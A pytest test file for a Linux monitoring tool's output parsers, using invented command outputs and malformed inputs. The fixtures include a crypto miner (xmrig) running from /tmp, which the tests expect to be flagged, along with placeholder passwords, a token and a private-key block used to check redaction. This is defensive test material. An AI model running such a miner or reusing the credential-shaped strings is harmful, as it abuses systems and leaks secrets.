"""Each parser on a realistic sample, and on the input it must refuse.

Samples are in each tool's real output format (Ubuntu 24.04, kernel 6.8, systemd 255), trimmed,
with every name, address, size and identifier replaced by an invented one. `smartctl` and `nft`
need root, so their samples are written by hand from each tool's documented JSON shape
(smartmontools 7.4 `--json` output, nftables 1.0.9 `libnftables-json(5)`); they say so where they
are defined.
"""

from __future__ import annotations

import base64
import json
from typing import Any

import pytest

from neonwatch import schema
from neonwatch.probes import CATALOG, ParseError, frame_files, frame_listing, parse, parsers
from neonwatch.probes.catalog import JOURNAL_ERROR_LINES, JOURNAL_LINES
from neonwatch.probes.parsers import (
    APT_NAMES,
    ARGS_CHARS,
    COMMAND_CHARS,
    IDENT_CHARS,
    JOURNAL_KEPT,
    MAX_ENTRIES_PER_FILE,
    MAX_ENTRIES_TOTAL,
    MAX_ENV_PER_FILE,
    MAX_KEYS_PER_FILE,
    MESSAGE_CHARS,
    PARSERS,
    REDACT_CHARS,
    SCRIPT_CHARS,
    TOP_N,
)
from neonwatch.redact import MASK, redact_mapping


def roundtrip(data: dict[str, Any]) -> dict[str, Any]:
    """Every output must survive JSON unchanged: no tuples, sets, bytes or NaN."""
    assert json.loads(json.dumps(data, allow_nan=False)) == data
    return data


def p(probe_id: str, raw: bytes | str) -> dict[str, Any]:
    return roundtrip(parse(probe_id, raw.encode() if isinstance(raw, str) else raw))


# --- dispatch ---------------------------------------------------------------------------------


def test_every_catalog_probe_has_a_parser() -> None:
    assert {spec.id for spec in CATALOG} == set(PARSERS)


def test_an_unknown_probe_is_refused() -> None:
    with pytest.raises(ParseError, match="no parser"):
        parse("rm.rf", b"")


def test_expanded_smart_ids_reach_the_smart_parser_and_others_do_not() -> None:
    assert p("smart.nvme0n1", SMART_NVME)["device"] == "/dev/nvme0n1"
    for bad in ("smart.loop0", "smart.", "smart.nvme0n1.x", "load.sda"):
        with pytest.raises(ParseError, match="no parser"):
            parse(bad, SMART_NVME.encode())


def test_a_parser_bug_on_odd_input_is_a_parse_error_not_a_crash() -> None:
    with pytest.raises(ParseError):
        parse("gpu", b"\xff\xfe")


def test_an_unexpected_shape_deep_in_a_parser_is_still_a_parse_error() -> None:
    # `smart_status` as a string: an AttributeError inside the parser, outside any record.
    raw = json.dumps({"smartctl": {"exit_status": 0}, "device": {"name": "/dev/sda"},
                      "smart_status": "yes"})
    with pytest.raises(ParseError, match="unreadable output"):
        parse("smart.sda", raw.encode())


def test_parse_error_is_a_value_error() -> None:
    assert issubclass(ParseError, ValueError)


# --- fast tier --------------------------------------------------------------------------------


def test_load() -> None:
    assert p("load", "4.86 5.33 5.10 6/11387 1003507\n") == {
        "load1": 4.86, "load5": 5.33, "load15": 5.1, "runnable": 6, "threads": 11387,
        "last_pid": 1003507}


@pytest.mark.parametrize("raw", ["", "4.86 5.33\n", "a b c 1/2 3", "1 2 3 4 5", "1 2 3 1/x 5"])
def test_load_refuses(raw: str) -> None:
    with pytest.raises(ParseError):
        parse("load", raw.encode())


def test_uptime() -> None:
    assert p("uptime", "7333.59 190218.89\n") == {"uptime_s": 7333.59, "idle_s": 190218.89}
    with pytest.raises(ParseError):
        parse("uptime", b"7333.59\n")


PSI_MEMORY = """\
some avg10=0.00 avg60=0.10 avg300=0.29 total=85768295
full avg10=0.00 avg60=0.10 avg300=0.24 total=75669682
"""


def test_psi_with_both_lines() -> None:
    assert p("psi.memory", PSI_MEMORY) == {
        "some_avg10": 0.0, "some_avg60": 0.1, "some_avg300": 0.29, "some_total_us": 85768295,
        "full_avg10": 0.0, "full_avg60": 0.1, "full_avg300": 0.24, "full_total_us": 75669682}


def test_psi_cpu_on_a_kernel_without_a_full_line() -> None:
    data = p("psi.cpu", "some avg10=1.37 avg60=1.28 avg300=1.93 total=128192143\n")
    assert data["some_avg10"] == 1.37
    assert data["full_avg10"] is None and data["full_total_us"] is None


@pytest.mark.parametrize("raw", [
    "", "full avg10=0.00 avg60=0.00 avg300=0.00 total=0\n",
    "some avg10=0.00 avg60=0.00 total=1\n", "some avg10=x avg60=0 avg300=0 total=1\n",
    "some avg10=0 avg60=0 avg300=0 total=1\nsome avg10=0 avg60=0 avg300=0 total=1\n",
    "odd avg10=0 avg60=0 avg300=0 total=1\n"])
def test_psi_refuses(raw: str) -> None:
    with pytest.raises(ParseError):
        parse("psi.io", raw.encode())


MEMINFO = """\
MemTotal:       65908516 kB
MemFree:         918664 kB
MemAvailable:   40786456 kB
Buffers:          326564 kB
Cached:         39243232 kB
SwapCached:       152064 kB
Active:         45160482 kB
SwapTotal:      122070526 kB
SwapFree:       119314046 kB
Dirty:              1804 kB
Writeback:             0 kB
AnonPages:      21109304 kB
Shmem:           599908 kB
Slab:            2403906 kB
CommitLimit:    155024784 kB
Committed_AS:   85996764 kB
HardwareCorrupted:     0 kB
HugePages_Total:       0
Hugepagesize:       1024 kB
"""


def test_memory() -> None:
    data = p("memory", MEMINFO)
    assert data == {
        "mem_total_kb": 65908516, "mem_free_kb": 918664, "mem_available_kb": 40786456,
        "buffers_kb": 326564, "cached_kb": 39243232, "swap_total_kb": 122070526,
        "swap_free_kb": 119314046, "swap_cached_kb": 152064, "dirty_kb": 1804,
        "writeback_kb": 0, "anon_pages_kb": 21109304, "shmem_kb": 599908, "slab_kb": 2403906,
        "commit_limit_kb": 155024784, "committed_as_kb": 85996764,
        "hardware_corrupted_kb": 0, "mem_available_pct": 61.88, "swap_used_pct": 2.26}


def test_memory_without_swap_or_memory_failure_support() -> None:
    raw = MEMINFO.replace("SwapTotal:      122070526", "SwapTotal:      0").replace(
        "SwapFree:       119314046", "SwapFree:       0").replace(
        "HardwareCorrupted:     0 kB\n", "")
    data = p("memory", raw)
    assert data["swap_used_pct"] == 0.0
    assert data["hardware_corrupted_kb"] is None


@pytest.mark.parametrize("raw", [
    "", MEMINFO.replace("MemAvailable:   40786456 kB\n", ""),
    MEMINFO.replace("40786456", "lots"), "MemTotal 5 kB\n",
    MEMINFO.replace("MemTotal:       65908516", "MemTotal:       0")])
def test_memory_refuses(raw: str) -> None:
    with pytest.raises(ParseError):
        parse("memory", raw.encode())


VMSTAT = """\
nr_free_pages 400670
pswpin 126879
pswpout 1416051
pgfault 418482556
pgmajfault 275151
oom_kill 0
"""


def test_vmstat() -> None:
    assert p("vmstat", VMSTAT) == {"oom_kill": 0, "pgfault": 418482556, "pgmajfault": 275151,
                                   "pswpin": 126879, "pswpout": 1416051}
    with pytest.raises(ParseError, match="oom_kill"):
        parse("vmstat", VMSTAT.replace("oom_kill 0\n", "").encode())
    with pytest.raises(ParseError):
        parse("vmstat", VMSTAT.replace("oom_kill 0", "oom_kill x").encode())


PROC_STAT = """\
cpu  2872093 1 879035 19854903 178072 0 36536 0 0 0
cpu0 84194 0 27320 552152 7890 0 822 0 0 0
cpu1 82657 0 27790 582432 8324 0 657 0 0 0
intr 506235265 133 0 0 0
ctxt 1123023578
btime 1790701234
processes 1047369
procs_running 2
procs_blocked 1
softirq 193365727 3746093 6548036 5612
"""


def test_cpu_stat() -> None:
    assert p("cpu.stat", PROC_STAT) == {
        "user": 2872093, "nice": 1, "system": 879035, "idle": 19854903, "iowait": 178072,
        "irq": 0, "softirq": 36536, "steal": 0, "cpus": 2, "ctxt": 1123023578,
        "btime": 1790701234, "processes": 1047369, "procs_running": 2, "procs_blocked": 1}


@pytest.mark.parametrize("raw", [
    "", PROC_STAT.replace("ctxt 1123023578\n", ""), PROC_STAT.replace("cpu  2872093 1", "cpu  x 1"),
    PROC_STAT.replace("cpu  2872093 1 879035 19854903 178072 0 36536 0 0 0", "cpu  1 2 3"),
    "\n".join(line for line in PROC_STAT.splitlines() if not line.startswith("cpu")) + "\n"])
def test_cpu_stat_refuses(raw: str) -> None:
    with pytest.raises(ParseError):
        parse("cpu.stat", raw.encode())


SENSORS = """\
{
   "iwlwifi_1-virtual-0":{
      "Adapter": "Virtual device",
      "temp1":{
         "temp1_input": 44.000
      }
   },
   "nvme-pci-0600":{
      "Adapter": "PCI adapter",
      "Composite":{
         "temp1_input": 57.850,
         "temp1_max": 74.850,
         "temp1_min": -20.150,
         "temp1_crit": 79.850,
         "temp1_alarm": 0.000
      }
   },
   "k10temp-pci-00c3":{
      "Adapter": "PCI adapter",
      "Tctl":{
         "temp1_input": 68.875
      },
      "Tccd1":{
         "temp3_input": 50.750
      }
   },
   "nct6796-isa-0290":{
      "Adapter": "ISA adapter",
      "fan2":{
         "fan2_input": 1054.000,
         "fan2_min": 0.000,
         "fan2_alarm": 0.000
      },
      "intrusion0":{
         "intrusion0_alarm": 1.000
      }
   }
}
"""


def test_sensors() -> None:
    data = p("sensors", SENSORS)
    assert data["count"] == 5
    assert data["readings"][1] == {
        "chip": "nvme-pci-0600", "adapter": "PCI adapter", "label": "Composite",
        "sensor": "temp1", "kind": "temp", "input": 57.85, "min": -20.15, "max": 74.85,
        "crit": 79.85, "alarm": 0.0}
    assert data["readings"][3]["label"] == "Tccd1"
    assert data["readings"][3]["sensor"] == "temp3"
    fan = data["readings"][4]
    assert (fan["kind"], fan["input"], fan["max"], fan["crit"]) == ("fan", 1054.0, None, None)
    # A feature with no `_input` (the intrusion switch) is not a reading.
    assert "intrusion0" not in {r["label"] for r in data["readings"]}


@pytest.mark.parametrize("raw", [
    "", "[]", '{"chip": 3}', '{"c": {"Adapter": "x", "t": {"temp1_input": "hot"}}}',
    '{"c": {"t": {"temp1_input": true}}}', "{not json"])
def test_sensors_refuses(raw: str) -> None:
    with pytest.raises(ParseError):
        parse("sensors", raw.encode())


GPU = """\
0, NVIDIA GeForce RTX 4090, 54, 30.54, 300.00, 42226, 49140, 0, 0x0000000000000001, 4, 16
1, NVIDIA GeForce RTX 4090, 70, 77.53, 300.00, 3590, 49140, 29, 0x0000000000000044, 16, 16
"""


def test_gpu() -> None:
    data = p("gpu", GPU)
    assert data["count"] == 2
    assert data["gpus"][0] == {
        "index": 0, "name": "NVIDIA GeForce RTX 4090", "temperature_c": 54,
        "power_w": 30.54, "power_limit_w": 300.0, "memory_used_mib": 42226,
        "memory_total_mib": 49140, "utilization_pct": 0, "throttle_reasons": 1,
        "throttle": ["gpu_idle"], "pcie_width": 4, "pcie_width_max": 16}
    assert data["gpus"][1]["throttle"] == ["sw_power_cap", "hw_thermal_slowdown"]


def test_gpu_fields_the_driver_does_not_report_are_null() -> None:
    raw = "0, Tesla T4, 40, [N/A], [Not Supported], 0, 15360, [N/A], [N/A], 16, 16\n"
    gpu = p("gpu", raw)["gpus"][0]
    assert gpu["power_w"] is None and gpu["power_limit_w"] is None
    assert gpu["utilization_pct"] is None
    assert gpu["throttle_reasons"] is None and gpu["throttle"] == []


@pytest.mark.parametrize("raw", [
    "", "No devices were found\n", "0, name, 54\n",
    "x, NVIDIA, 54, 30.54, 300.00, 1, 2, 0, 0x1, 4, 16\n",
    "0, NVIDIA, hot, 30.54, 300.00, 1, 2, 0, 0x1, 4, 16\n",
    "0, NVIDIA, 54, 30.54, 300.00, 1, 2, 0, 0xZZ, 4, 16\n"])
def test_gpu_refuses(raw: str) -> None:
    with pytest.raises(ParseError):
        parse("gpu", raw.encode())


DF = """\
Filesystem           Type         1B-blocks          Used         Avail    Inodes    IUsed Mounted on
tmpfs                tmpfs      13498064896       5595136   13492469760  16477129     2535 /run
/dev/nvme0n1p6       ext4      107647585689   23368681881  78769672396  12214272  1040115 /
/dev/nvme0n1p5       vfat        2744415027       3541401    2740873625         0        0 /boot/efi
/dev/nvme2n1p1       ext4     553838676582  292940642508  232723084492  62513152 11892787 /mnt/backup data
/home/alice/.Private ecryptfs 1889153956659 1169121655398 624026458316 213065728 12409045 /home/alice
"""  # noqa: E501 — real tool output, kept at its real width


def test_disk_fill() -> None:
    data = p("disk.fill", DF)
    assert data["count"] == 5
    assert data["filesystems"][1] == {
        "source": "/dev/nvme0n1p6", "fstype": "ext4", "mount": "/",
        "size_bytes": 107647585689, "used_bytes": 23368681881, "avail_bytes": 78769672396,
        "used_pct": 22.88, "inodes": 12214272, "inodes_used": 1040115, "inodes_used_pct": 8.52}
    efi = data["filesystems"][2]
    assert efi["inodes_used_pct"] is None  # vfat has no inodes
    assert data["filesystems"][3]["mount"] == "/mnt/backup data"


def test_disk_fill_of_an_empty_filesystem_has_no_percentage() -> None:
    raw = DF.splitlines()[0] + "\nnone  tmpfs 0 0 0 0 0 /x\n"
    assert p("disk.fill", raw)["filesystems"][0]["used_pct"] is None


@pytest.mark.parametrize("raw", ["", DF.splitlines()[0] + "\n",
                                 DF.splitlines()[0] + "\n/dev/x ext4 1 2\n",
                                 "\n".join(DF.splitlines()[1:]) + "\n"])
def test_disk_fill_refuses(raw: str) -> None:
    with pytest.raises(ParseError):
        parse("disk.fill", raw.encode())


NET_DEV = """\
Inter-|   Receive                                                |  Transmit
 face |bytes    packets errs drop fifo frame compressed multicast|bytes    packets errs drop fifo colls carrier compressed
    lo: 334455955  487800    0    0    0     0          0         0 334455955  487800    0    0    0     0       0          0
enp5s0: 8967037735 7687572    0 27993    0     0          0      4112 2908280573 5134861    0    0    0     0       0          0
veth676149e:    1296      16    0    0    0     0          0         0    18720     143    0    0    0     0       0          0
"""  # noqa: E501 — real tool output, kept at its real width


def test_net_dev() -> None:
    data = p("net.dev", NET_DEV)
    assert data["count"] == 3
    assert [i["name"] for i in data["interfaces"]] == ["lo", "enp5s0", "veth676149e"]
    assert data["interfaces"][1] == {
        "name": "enp5s0", "rx_bytes": 8967037735, "rx_packets": 7687572, "rx_errs": 0,
        "rx_drop": 27993, "rx_fifo": 0, "rx_frame": 0, "rx_compressed": 0, "rx_multicast": 4112,
        "tx_bytes": 2908280573, "tx_packets": 5134861, "tx_errs": 0, "tx_drop": 0, "tx_fifo": 0,
        "tx_colls": 0, "tx_carrier": 0, "tx_compressed": 0}


@pytest.mark.parametrize("raw", ["", "Inter-|\n face |\n", "Inter-|\n face |\n lo: 1 2 3\n",
                                 "Inter-|\n face |\ngarbage line\n"])
def test_net_dev_refuses(raw: str) -> None:
    with pytest.raises(ParseError):
        parse("net.dev", raw.encode())


# --- medium tier ------------------------------------------------------------------------------

PS = """\
      1       0 root                             Ss    0.2 15268    7626    1       17 4026531836 systemd         /sbin/init splash
      2       0 root                             S     0.0     0    7626    1        0 4026531836 kthreadd        [kthreadd]
   1273       2 root                             S     0.0     0    7760    1        0 4026531836 UVM global queu [UVM global queue]
1062080 1062047 root                             Rsl  89.9 135368     24    2       21 4026532871 python          python -m pytest -q -p no:cacheprovider
  24015    8540 alice                            Sl   57.2 4842808  7708  794     4409 4026531836 devtool         /opt/devtool/devtool-2025.2.3/bin/devtool
  21637   21559 alice                            Sl   43.4 114252   7717   14     3355 4026531836 RDD Process     /usr/lib/firefox/firefox-bin -contentproc -parentBuildID 20250101
  19151   19102 dhcpcd                           Ssl   0.4 77692    7338   29       31          - store           store server -config=/store/config --password=hunter2hunter2
 171718  171696 alice                            Z     0.0     0    6301    1        0 4026531836 sd_espeak-ng-mb [sd_espeak-ng-mb] <defunct>
   4242       1 nobody                           D     1.5  2048     100    1        2 4026531836 xmrig           /tmp/.x/xmrig --donate-level 1
"""  # noqa: E501 — real tool output, kept at its real width


def test_processes_totals() -> None:
    data = p("processes", PS)
    assert data["count"] == 9
    assert data["threads"] == 1 + 1 + 1 + 2 + 794 + 14 + 29 + 1 + 1
    assert data["rss_kb_total"] == 15268 + 135368 + 4842808 + 114252 + 77692 + 2048
    assert data["cpu_pct_total"] == 192.6
    assert data["zombies"] == 1
    assert data["uninterruptible"] == 1
    assert data["redacted"] == 1


def test_processes_top_lists_and_entry_shape() -> None:
    data = p("processes", PS)
    assert [e["pid"] for e in data["top_cpu"][:3]] == [1062080, 24015, 21637]
    assert [e["pid"] for e in data["top_rss"][:2]] == [24015, 1062080]
    firefox = data["top_cpu"][2]
    assert firefox == {
        "pid": 21637, "ppid": 21559, "user": "alice", "state": "Sl", "cpu_pct": 43.4,
        "rss_kb": 114252, "elapsed_s": 7717, "threads": 14, "cpu_s": 3355,
        "comm": "RDD Process",
        "args": "/usr/lib/firefox/firefox-bin -contentproc -parentBuildID 20250101",
        "pid_ns": "host"}
    kernel = next(e for e in data["top_rss"] if e["pid"] == 1273)
    assert kernel["comm"] == "UVM global queu"
    assert kernel["args"] == "[UVM global queue]"
    vault = next(e for e in data["top_cpu"] if e["pid"] == 19151)
    assert "hunter2" not in vault["args"] and MASK in vault["args"]
    assert "environ" not in json.dumps(data)


def test_processes_running_from_tmp_are_listed() -> None:
    data = p("processes", PS)
    assert [(e["pid"], e["comm"]) for e in data["from_tmp"]] == [(4242, "xmrig")]
    assert data["tmp_test_runs"] == []


def ps_line(pid: int, ppid: int, args: str, user: str = "10001", ns: int = 4026532000) -> str:
    return (f"{pid:7d} {ppid:7d} {user:<32} S     0.0  2048     100    1        0 {ns} "
            f"python          {args}")


RUNNER = "python -m pytest -q tests/acceptance"
VENV = "/tmp/pytest-of-alice/pytest-0/test_r37_route0/venv/bin/python"


def test_a_pytest_runs_programs_are_grouped_under_the_runner_not_listed_one_by_one() -> None:
    # 2026-10-30: each test of a suite in a container was its own CRITICAL issue.
    raw = "\n".join([
        ps_line(1, 0, "/sbin/init", "root", 4026531836),
        ps_line(500, 1, RUNNER),
        ps_line(501, 500, VENV + " -c from worker.supervisor import main"),
        ps_line(502, 501, VENV + " -I -m worker.child"),   # a grandchild, through the tmp one
        ps_line(503, 500, VENV + " -I -m worker.child"),
        ps_line(600, 1, "/tmp/.x/xmrig --donate-level 1"),
    ]).encode()
    data = p("processes", raw)
    assert [e["pid"] for e in data["from_tmp"]] == [600]
    assert data["tmp_test_runs"] == [{
        "pid": 500, "user": "10001", "pid_ns": "separate", "args": RUNNER, "processes": 3,
        "programs": [VENV], "pids": [501, 502, 503]}]


@pytest.mark.parametrize("runner, program", [
    ("python -m pytester run", VENV),                # not pytest
    ("/usr/bin/bash run.sh", VENV),                  # not a test runner at all
    (RUNNER, "/tmp/go-build1/b001/exe/main"),        # pytest, but not its own directory
    ("/tmp/venv/bin/python -m pytest", VENV),        # the runner itself lives in /tmp
])
def test_anything_short_of_pytest_running_from_its_own_directory_stays_listed(runner,
                                                                               program) -> None:
    raw = "\n".join([ps_line(500, 1, runner), ps_line(501, 500, program)]).encode()
    data = p("processes", raw)
    assert 501 in [e["pid"] for e in data["from_tmp"]] and data["tmp_test_runs"] == []


def test_an_orphan_or_a_chain_too_deep_to_reach_its_runner_stays_listed() -> None:
    orphan = ps_line(501, 499, VENV)                  # its parent is not in the table
    chain = [ps_line(500, 1, RUNNER)] + [
        ps_line(510 + i, 509 + i if i else 500, VENV) for i in range(parsers.ANCESTRY + 2)]
    data = p("processes", "\n".join([orphan, *chain]).encode())
    listed = {e["pid"] for e in data["from_tmp"]}
    assert 501 in listed and 510 + parsers.ANCESTRY + 1 in listed
    assert 510 not in listed   # the first link is still the runner's


def test_a_test_run_keeps_three_programs_and_caps_its_pids() -> None:
    lines = [ps_line(500, 1, RUNNER)] + [
        ps_line(600 + i, 500, f"/tmp/pytest-of-alice/pytest-0/t{i}/venv/bin/python")
        for i in range(parsers.FROM_TMP_N + 5)]
    (run,) = p("processes", "\n".join(lines).encode())["tmp_test_runs"]
    assert run["processes"] == parsers.FROM_TMP_N + 5
    assert len(run["programs"]) == 3 and len(run["pids"]) == parsers.FROM_TMP_N


def test_processes_say_which_run_in_pid_1s_pid_namespace() -> None:
    # Root in a container is ordinary; without this a root uvicorn in a compose service read as
    # unexpected root on the host (2026-10-27).
    by_pid = {e["pid"]: e for key in ("top_cpu", "top_rss") for e in p("processes", PS)[key]}
    assert by_pid[1]["pid_ns"] == by_pid[24015]["pid_ns"] == "host"
    assert by_pid[1062080]["pid_ns"] == "separate"
    assert by_pid[19151]["pid_ns"] is None   # ps could not read it
    unknown_init = PS.replace("       17 4026531836 systemd", "       17          - systemd")
    assert {e["pid_ns"] for e in p("processes", unknown_init)["top_cpu"]} == {None}


def test_processes_caps_lists_and_args() -> None:
    long_args = "java -cp " + "x" * 2000
    lines = [f"{pid:7d}       1 root                             S     {pid / 10:.1f} {pid * 3}"
             f"    100    1        0 4026531836 java            {long_args}"
             for pid in range(1, 60)]
    data = p("processes", "\n".join(lines) + "\n")
    assert data["count"] == 59
    assert len(data["top_cpu"]) == len(data["top_rss"]) == TOP_N
    assert data["top_cpu"][0]["pid"] == 59
    assert len(data["top_cpu"][0]["args"]) == ARGS_CHARS


@pytest.mark.parametrize("raw", ["", "not a process line\n",
                                 "  1 0 root Ss 0.2 15268 7626 1 17 4026531836 systemd\n"])
def test_processes_refuses(raw: str) -> None:
    with pytest.raises(ParseError):
        parse("processes", raw.encode())


FAILED = ('[{"unit":"casper-md5check.service","load":"loaded","active":"failed","sub":"failed",'
          '"description":"casper-md5check Verify Live ISO checksums"}]\n')


def test_units_failed() -> None:
    assert p("units.failed", FAILED) == {"count": 1, "skipped": 0, "units": [
        {"unit": "casper-md5check.service", "load": "loaded", "active": "failed",
         "sub": "failed", "description": "casper-md5check Verify Live ISO checksums"}]}
    assert p("units.failed", "[]\n") == {"count": 0, "skipped": 0, "units": []}


@pytest.mark.parametrize("raw", ["", "{}", '[{"unit": "x"}]', '[{"unit": 3, "load": "", '
                                 '"active": "", "sub": "", "description": ""}]', "[1]"])
def test_units_failed_refuses(raw: str) -> None:
    with pytest.raises(ParseError):
        parse("units.failed", raw.encode())


def journal_line(message: Any, *, unit: str | None = "openvpn.service",
                 ident: str | None = "openvpn", transport: str = "syslog",
                 priority: str = "4", usec: int = 1790798352704064) -> str:
    entry: dict[str, Any] = {"__CURSOR": "s=0;i=1", "__REALTIME_TIMESTAMP": str(usec),
                             "__MONOTONIC_TIMESTAMP": "7389786657", "_BOOT_ID": "0" * 32,
                             "PRIORITY": priority, "_TRANSPORT": transport, "MESSAGE": message}
    if unit is not None:
        entry["_SYSTEMD_UNIT"] = unit
    if ident is not None:
        entry["SYSLOG_IDENTIFIER"] = ident
    return json.dumps(entry)


JOURNAL = "\n".join([
    "",
    journal_line("Unable to get any DNS server for interface veth676149e"),
    journal_line("IP_ADD_MEMBERSHIP failed: No buffer space available",
                 unit="avahi-daemon.service", ident="avahi-daemon"),
    journal_line("__common_interrupt: 1.55 No irq handler for vector", unit=None, ident="kernel",
                 transport="kernel", priority="0", usec=1790798353000000),
    journal_line("Failed to start casper-md5check.service - Verify Live ISO checksums.",
                 unit="init.scope", ident="systemd", transport="journal", priority="3"),
    journal_line("login: token=ghp_abcdefghijklmnopqrstuvwx1234 accepted", unit=None, ident=None,
                 transport="stdout"),
    journal_line([70, 97, 105, 108, 32, 255], unit="odd.service", ident=None),
    journal_line(None, unit="big.service", ident=None),
]) + "\n"


def test_journal_entries() -> None:
    data = p("journal.warnings", JOURNAL)
    assert data["count"] == data["kept"] == 7
    assert data["capped"] is False
    assert data["entries"][0] == {
        "at": 1790798352.704064, "unit": "openvpn.service", "identifier": "openvpn",
        "transport": "syslog", "priority": 4,
        "message": "Unable to get any DNS server for interface veth676149e"}
    kernel = data["entries"][2]
    assert (kernel["unit"], kernel["identifier"], kernel["priority"]) == ("", "kernel", 0)
    assert data["entries"][5]["message"] == "Fail �"
    assert data["entries"][6]["message"] == ""


def test_journal_counts_and_redaction() -> None:
    data = p("journal.warnings", JOURNAL)
    assert data["by_unit"] == {"openvpn.service": 1, "avahi-daemon.service": 1, "kernel": 1,
                               "init.scope": 1, "unknown": 1, "odd.service": 1,
                               "big.service": 1}
    assert data["by_priority"] == {"0": 1, "3": 1, "4": 5}
    assert data["redacted"] == 1
    assert "ghp_" not in json.dumps(data)


def test_journal_truncates_messages_after_redacting_them() -> None:
    secret = "x" * (MESSAGE_CHARS - 10) + " password=hunter2hunter2"
    entry = p("journal.warnings", journal_line(secret) + "\n")["entries"][0]
    assert len(entry["message"]) == MESSAGE_CHARS
    assert "hunter" not in entry["message"]


# A private key block that starts inside the kept 300 characters and ends well past the old
# 600-character redaction window: only redacting the whole field matches BEGIN...END.
KEY_BODY = "\n".join(["b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gt"] * 14)
PRIVATE_KEY = ("-----BEGIN OPENSSH PRIVATE KEY-----\n" + KEY_BODY
               + "\n-----END OPENSSH PRIVATE KEY-----")


def test_a_private_key_spanning_the_old_window_is_redacted_whole() -> None:
    message = "backup script dumped: " + PRIVATE_KEY + " (end)"
    assert message.index("-----BEGIN") < MESSAGE_CHARS < 600 < message.index("-----END")
    entry = p("journal.warnings", journal_line(message) + "\n")
    assert entry["redacted"] == 1
    kept = entry["entries"][0]["message"]
    assert "b3BlbnNzaC1rZXk" not in kept and "BEGIN OPENSSH" not in kept
    assert kept == f"backup script dumped: {MASK} (end)"


def test_a_private_key_in_a_command_line_is_redacted_whole() -> None:
    args = "/usr/bin/tool --key '" + PRIVATE_KEY + "'"
    line = (f"   4242       1 root                             S     0.0  2048     100    1"
            f"        0          - tool            {args}")
    proc = p("processes", line.replace("\n", "\\n") + "\n")["top_cpu"][0]
    # ps prints a newline in argv as a visible escape, so the block arrives on one line.
    assert "b3BlbnNzaC1rZXk" not in proc["args"]


def test_redaction_reads_the_field_up_to_its_cap_and_no_further() -> None:
    assert REDACT_CHARS == 4096
    late = "x " * ((REDACT_CHARS - 40) // 2) + "password=hunter2hunter2"
    assert late.index("password") < REDACT_CHARS
    entry = p("journal.warnings", journal_line(late) + "\n")
    assert entry["redacted"] == 1


def test_journal_keeps_the_newest_entries_and_says_when_the_source_was_capped() -> None:
    lines = [journal_line(f"m{i}", usec=1790798352000000 + i) for i in range(JOURNAL_LINES)]
    data = p("journal.warnings", "\n".join(lines) + "\n")
    assert data["count"] == JOURNAL_LINES and data["capped"] is True
    assert data["kept"] == len(data["entries"]) == JOURNAL_KEPT
    assert data["entries"][-1]["message"] == f"m{JOURNAL_LINES - 1}"
    assert data["by_unit"] == {"openvpn.service": JOURNAL_LINES}


def test_journal_errors_reads_the_same_shape_and_caps_at_its_own_limit() -> None:
    assert p("journal.errors", JOURNAL) == p("journal.warnings", JOURNAL)
    lines = [journal_line(f"e{i}", priority="3", usec=1790798352000000 + i)
             for i in range(JOURNAL_ERROR_LINES)]
    data = p("journal.errors", "\n".join(lines) + "\n")
    assert data["count"] == JOURNAL_ERROR_LINES and data["capped"] is True
    assert data["by_unit"] == {"openvpn.service": JOURNAL_ERROR_LINES}
    one_short = p("journal.errors", "\n".join(lines[1:]) + "\n")
    assert one_short["capped"] is False


def test_the_warning_cap_is_its_own() -> None:
    lines = [journal_line(f"m{i}") for i in range(JOURNAL_LINES - 1)]
    assert p("journal.warnings", "\n".join(lines) + "\n")["capped"] is False


def test_journal_with_nothing_new() -> None:
    assert p("journal.warnings", b"") == {"entries": [], "count": 0, "kept": 0, "capped": False,
                                         "by_unit": {}, "by_priority": {}, "redacted": 0,
                                         "skipped": 0, "truncated": False}


UNREADABLE_ENTRIES = [
    "{not json}", "[1]", journal_line("m", priority="warning"),
    journal_line("m", priority=["3", "4"]),  # type: ignore[arg-type]  # a repeated PRIORITY
    json.dumps({"MESSAGE": "no time", "PRIORITY": "4"}),
    json.dumps({"MESSAGE": "bad time", "PRIORITY": "4", "__REALTIME_TIMESTAMP": None}),
]


@pytest.mark.parametrize("bad", UNREADABLE_ENTRIES)
def test_an_unreadable_journal_entry_is_skipped_and_counted_never_fatal(bad: str) -> None:
    good = journal_line("real error", priority="3")
    for probe in ("journal.warnings", "journal.errors"):
        data = p(probe, f"{good}\n{bad}\n{good}\n")
        assert (data["count"], data["skipped"]) == (2, 1)
        assert [e["message"] for e in data["entries"]] == ["real error", "real error"]


def test_a_journal_of_nothing_but_hostile_entries_is_still_an_observation() -> None:
    data = p("journal.errors", "\n".join(UNREADABLE_ENTRIES) + "\n")
    assert (data["count"], data["skipped"], data["entries"]) == (0, len(UNREADABLE_ENTRIES), [])


def test_the_skipped_count_toward_the_cap() -> None:
    lines = [journal_line("m")] * (JOURNAL_ERROR_LINES - 1) + ["{not json}"]
    data = p("journal.errors", "\n".join(lines) + "\n")
    assert data["capped"] is True and data["skipped"] == 1


# journalctl -o json encodes an over-threshold field as null, a repeated field as
# an array of values, and a non-UTF-8 field as an array of bytes. Any local user can send each
# one with `logger --journald`. None of them may blank the probe.
@pytest.mark.parametrize(("ident", "expected"), [
    (None, ""),
    ([0x61, 0x62, 0xFF], "ab\ufffd"),
    (["a", "b"], "a|b"),
    ([[0x61], "b"], "a|b"),
    ({"x": 1}, ""),
    (7, ""),
    ([300], ""),
    ("i" * 5000, "i" * 128),
])
def test_hostile_identifier_encodings_are_coerced_not_fatal(ident: Any, expected: str) -> None:
    hostile = json.loads(journal_line("flood", unit=None, ident=None, priority="3"))
    hostile["SYSLOG_IDENTIFIER"] = ident
    good = journal_line("disk error", unit="kernel", ident="kernel", priority="3")
    data = p("journal.errors", f"{good}\n{json.dumps(hostile)}\n{good}\n")
    assert (data["count"], data["skipped"]) == (3, 0)
    assert data["entries"][1]["identifier"] == expected
    assert data["entries"][0]["message"] == "disk error"
    key = expected or "unknown"
    assert data["by_unit"] == {"kernel": 2, key: 1}


@pytest.mark.parametrize(("field", "value"), [
    ("_SYSTEMD_UNIT", ["a.service", "b.service"]), ("_SYSTEMD_UNIT", "u" * 5000),
    ("_TRANSPORT", None), ("MESSAGE", ["line one", "line two"]), ("MESSAGE", {"a": 1}),
    ("MESSAGE", [300]),
])
def test_other_hostile_fields_are_coerced_and_capped(field: str, value: Any) -> None:
    hostile = json.loads(journal_line("m", priority="3"))
    hostile[field] = value
    entry = p("journal.errors", json.dumps(hostile) + "\n")["entries"][0]
    assert all(isinstance(entry[k], str) for k in ("unit", "identifier", "transport", "message"))
    assert len(entry["unit"]) <= 128 and len(entry["transport"]) <= 128
